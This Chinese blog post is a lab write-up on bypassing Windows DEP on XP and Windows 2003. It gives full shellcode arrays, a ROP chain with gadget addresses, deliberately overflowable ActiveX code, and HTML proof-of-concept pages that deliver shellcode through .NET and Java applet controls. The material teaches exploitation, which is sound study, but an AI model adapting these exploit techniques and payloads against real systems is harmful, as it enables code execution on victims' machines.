---
title: 攻击DEP的方法(下)——可执行内存、.Net、Java Applet
date: 2017-07-12 10:01:59
categories: 安全技术
tags: [DEP, windows, .Net, java]
---

### 1. 利用可执行内存

#### 1.1 实验代码

<pre><code>
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

char shellcode[] = 
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90"
	"\x8A\x17\x84\x7C"			// pop eax retn
	"\x0B\x1A\xBF\x7C"			// pop pop retn
	"\xBA\xD9\xBB\x7C"			// 修正EBP
	"\x5F\x78\xA6\x7C"			// pop retn
	"\x08\x00\x14\x00"			// 弹出机器码在可执行空间的起始地址，转入执行用
	"\x00\x00\x14\x00"			// 可执行内存空间地址，复制用
	"\xBF\x7D\xC9\x77"			// push esp jmp eax && 跳转至(pop pop retn地址)
	"\xFF\x00\x00\x00"			// shellcode 长度
	"\xAC\xAF\x94\x7C"			// memcpy入口
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";

void test()
{
	char str[176];
	//__asm int 3
	memcpy(str, shellcode, 450);
}

int main()
{
	HINSTANCE hInst = LoadLibrary("shell32.dll");
	char temp[200];
	test();
	return 0;
}
</code></pre>

#### 1.2 实验内容

<b>实验思路</b>
1. 禁用GS和SafeSEH
2. test存在溢出
3. 覆盖返回地址后，通过Ret2Libc技术，利用memcpy函数将shellcode复制到可读可写可执行区域
4. 最后在这段可执行的内存空间中执行shellcode，实现DEP的绕过

<b>实验环境</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows 2003 SP2| |
|DEP状态|Optout||
|编译器|VC 6.0||
|编译选项|禁用优化选项||
|build版本|debug版本||

在OllyDbg中可以看出，在0x00140000的位置，Access和Initial Access都是RWE，这代表这一段是可读可写可执行的内存，长度为0x1000。
1. 源内存起始地址  <font color=#f00>[ebp+0xC]</font>，用push esp jmp eax指令地址来填充，push esp后这个位置会覆盖为当前esp，以实现源内存起始地址的动态获取
2. 复制字符串长度：0xFF  <font color=#f00>[ebp+0x10]</font>
3. 目的地址0x00140000  <font color=#f00>[ebp+0x8]</font>

实验中，溢出字符串起始地址0x0012FDB0，返回地址0x0012FE68
pop eax retn地址:0x7C84178A
pop pop retn地址:0x7CBF1A0B(pop ebx pop edi retn)
修正EBP retn 4地址:0x7CBBD9BA(push esp pop ebp retn 4)
pop ecx retn地址:0x7CA6785F
push esp jmp eax地址:0x77C97DBF(用于跳转)
memcpy入口地址:0x7C94AFAC

### 2. 利用.NET

实验支持:
1. 具有溢出漏洞的ActiveX控件
2. 包含shellcode的.NET控件
3. 可以触发ActiveX控件中溢出漏洞的POC页面

#### 2.1 ActiveX控件

ActiveX控件
<pre><code>
void CVulnerAX_DEPCtrl::test(LPCTSTR str)
{
	// AFX_MANAGE_STATE(AfxGetStaticModuleState());
	// TODO: Add your dispatch handler code here
	printf("aaaa");
	char dest[100];
	sprintf(dest, "%s", str);
}
</code></pre>

<b>实验环境：</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows XP SP3||
|编译器|Visual Studio 2008| |
|优化|<font color=#f00>禁用优化选项</font>| |
|MFC|在静态库中使用MFC|工程属性->General->Use of MFC|
|字符集|使用Unicode字符集|工程属性->General->Character Set|
|build版本|release版本| |

编译好控件之后，在实验机器上注册该ActiveX控件.regsvr32

#### 2.2 包含shellcode的.NET控件

<font color=#f00>在VS2008中C#下边建立一个DLL解决方案</font>

![C#下建立的DLL解决方案](/images/2017-07-12/net.jpg)

包含shellcode的.NET控件代码
<pre><code>
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace DEP_NETDLL
{
    public class Class1
    {
        public void Shellcode()
        {
            string shellcode = 
                "\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
                "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
                "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
                "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c" +
                "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
                "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
                "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
                "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
                "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
                "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
                "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
                "\uff53\ufc57\uff53\uf857";
        }
    }
}

</code></pre>

<b>实验环境：</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows XP SP3||
|编译器|Visual Studio 2008| |
|基址|0x24240000||
|build版本|Debug版本|Release版本的优化会影响shellcode|

设置DLL的基址方法如下："Project->Properties->Build->Advanced"
![设置DLL基址](/images/2017-07-12/set_dll_address.jpg)

#### 2.3 POC及测试

编译好DLL之后，需要将DLL和溢出ActiveX控件的POC页面放到同一目录下，并通过如下调试代码调用

<pre><code>&lt;object classID="DEP_NETDLL.dll#DEP_NETDLL.Shellcode"&gt;&lt;/object&gt;
</code></pre>
    
Shellcode设置好后，就来设置POC页面，并将POC页面与.NET控件放到一台WEB服务器上，在实验机上访问这个POC页面，以触发ActiveX中的溢出漏洞，通过.NET控件绕过DEP。

POC页面如下

    <html>
    <body>
    <object classID="DEP_NETDLL.dll#DEP_NETDLL.Class1"></object>
    <object classid="clsid:053CC2BD-8E24-4E01-A950-9FF689F40487" id="test"></object>
    <script>
    var s = "\u9090";
    while(s.length < 54){
        s += "\u9090";
    }
    s += "\u24E2\u2424";
    test.test(s);
    </script>
    </body>
    </html>

<b>实验解释：</b>
1. 为了简单地反映绕过DEP的过程，本实验所攻击的ActiveX控件不启用GS
2. 通过web页面同时加载具有溢出漏洞的ActiveX控件和包含shellcode的.NET控件
3. ActiveX控件中的test函数存在典型的溢出
4. 编译.NET控件的时候，我们设置DLL的基址，所以我们将函数的返回地址覆盖为.NET控件中的shellcode起始地址，进而转入shellcode执行
5. 实验使用Unicode编码，在计算填充长度时要考虑Unicode与Ascii编码之间的长度差问题

<b>实验环境：</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows XP SP3||
|DEP|Optout| |
|浏览器|IE6||


当弹出下面所示对话框时用OllyDbg附加IE的进程，附加好后按一下F9键让程序继续运行。
![对话框](/images/2017-07-12/ie.jpg)

然后转到DEP_NETDLL.dll的内存空间中查找shellcode的具体位置，然后进入该内存空间。

shellcode的起始地址0x242424DF。而我们填充的字符串起始地址0x01EFF534，函数返回地址0x01EFF5A0，所以填充108（0x6C）字节就可以覆盖返回地址。

<font color=#f00>令人意外的是，我们无法包含dll文件，使用了所有可能的办法，都无法在html中使用dll</font>

### 3. 利用java applet

实验支持:
1. 具有溢出漏洞的ActiveX控件
2. 包含shellcode的Java Applet控件
3. 可以触发ActiveX控件中溢出漏洞的POC页面

#### 3.1 ActiveX控件

上一讲已经介绍

#### 3.2 包含shellcode的Java Applet控件

实验代码
<pre><code>
import java.applet.*;
import java.awt.*;
public class Shellcode extends Applet{
    public void init(){
        Runtime.getRuntime().gc();
        StringBuffer buffer = new StringBuffer(255);
        buffer.append("\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
                "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
                "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
                "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c" +
                "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
                "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
                "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
                "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
                "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
                "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
                "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
                "\uff53\ufc57\uff53\uf857");
    }
}
</code></pre>

编译成class文件后，在Web中通过如下代码调用
	<applet code=class文件名.class></applet>
    
<b>实验环境：</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows XP SP3||
|Java JDK|1.4.2| |
|目标版本|1.1|脱离JRE，在不具有JRE机器上也能执行|
|编译指令|javac 路径\Shellcode.java -target 1.1|

#### 3.3 POC及其利用

编译产生的Shellcode.class与POC放到同一目录下

POC页面代码
<pre><code>
&lt;html&gt;
&lt;body&gt;
&lt;applet code=Shellcode.class width=300 height=50&gt;&lt;/applet&gt;
&lt;script&gt;alert("开始溢出:");&lt;/script&gt;
&lt;object classid="clsid:053CC2BD-8E24-4E01-A950-9FF689F40487" id="test"&gt;&lt;/object&gt;
&lt;script&gt;
var s = "\u9090";
while(s.length &lt; 54){
    s += "\u9090";
}
s += "\u04FC\u1001";
test.test(s);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

代码解释:
1. ActiveX不使用GS
2. 通过Web页面同时加载具有溢出漏洞的ActiveX控件和包含shellcode的Java applet控件
3. java applet的内存空间中具有可执行权限，所以我们的shellcode有执行的机会
4. ActiveX控件中的test函数存在典型的溢出
5. 将函数的返回地址覆盖为Java Applet中的.text段的shellcode起始地址，进而转入shellcoe中执行
6. 实验用Unicode编码，需要考虑Unicode与Ascii之间的转换

<b>实验环境：</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows XP SP3||
|DEP状态|Optout||
|JRE状态|启用||
|Java JDK|1.4.2|不要使用高版本的JRE，否则Java applet申请的内存不在IE进程中 |
|浏览器|IE6||

在浏览器中启用JRE：Internet选项->高级->Java->将Java……用于&lt;applet&gt;

当弹出“开始溢出”对话框时用OllyDbg附加IE进程，附加好后用F9继续执行。而shellcode地址可以通过OllyFindAddr插件中的Custom-Search搜索弹出对话框机器码的前4字节"FC686A0A"来定位shellcode